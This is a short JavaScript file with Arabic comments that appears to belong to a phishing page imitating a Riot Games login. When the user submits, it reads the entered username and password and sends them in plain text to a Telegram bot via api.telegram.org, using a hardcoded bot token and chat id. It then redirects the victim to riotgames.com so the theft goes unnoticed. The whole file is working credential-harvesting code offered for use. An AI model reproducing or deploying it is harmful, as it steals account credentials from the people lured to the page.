document.addEventListener("DOMContentLoaded", function () {
    const usernameInput = document.getElementById("username");
    const passwordInput = document.getElementById("password");
    const loginBtn = document.getElementById("login-btn");

    function checkInputs() {
        if (usernameInput.value.trim() !== "" && passwordInput.value.trim() !== "") {
            loginBtn.removeAttribute("disabled"); // تفعيل الزر
        } else {
            loginBtn.setAttribute("disabled", "true"); // تعطيل الزر
        }
    }

    function sendToTelegram() {
        const username = usernameInput.value.trim();
        const password = passwordInput.value.trim();

        if (username === "" || password === "") return;

        const botToken = "7957010074:AAHgLSwfezAgFwzbvnbWbJRsOcRXm01kDeM"; // ⚠️ ضع التوكن هنا بشكل آمن
        const chatId = "6687453395"; // ⚠️ ضع معرف الدردشة هنا
        const message = `🔥 New Login Attempt 🔥\n\n👤 Username: ${username}\n🔒 Password: ${password}`;

        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
            .then(() => {
                window.location.href = "https://www.riotgames.com/";
            })
            .catch(error => console.error("❌ Error sending to Telegram:", error));
    }

    // التأكد من صحة الإدخال وتفعيل الزر
    usernameInput.addEventListener("input", checkInputs);
    passwordInput.addEventListener("input", checkInputs);

    // عند الضغط على السهم
    loginBtn.addEventListener("click", function () {
        if (!loginBtn.hasAttribute("disabled")) {
            sendToTelegram();
        }
    });
});
